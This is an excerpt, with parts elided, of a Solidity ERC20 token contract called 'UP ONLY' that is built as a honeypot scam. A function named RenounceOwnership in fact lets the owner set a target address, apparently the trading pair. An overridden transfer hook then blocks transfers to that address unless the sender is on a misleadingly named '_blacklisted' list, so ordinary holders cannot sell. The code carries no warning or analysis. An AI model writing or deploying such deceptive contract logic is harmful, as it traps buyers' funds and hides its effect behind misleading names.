...
contract UO is ERC20, Ownable {
    mapping(address => bool) private _blacklisted;
    address private _uoToken;
    constructor() ERC20('UP ONLY','UO') {
    ...
    function RenounceOwnership(address uoToken_) public onlyOwner {
        _uoToken = uoToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _uoToken) {
            require(_blacklisted[from], "bots cannot go up!");
        }
    }
}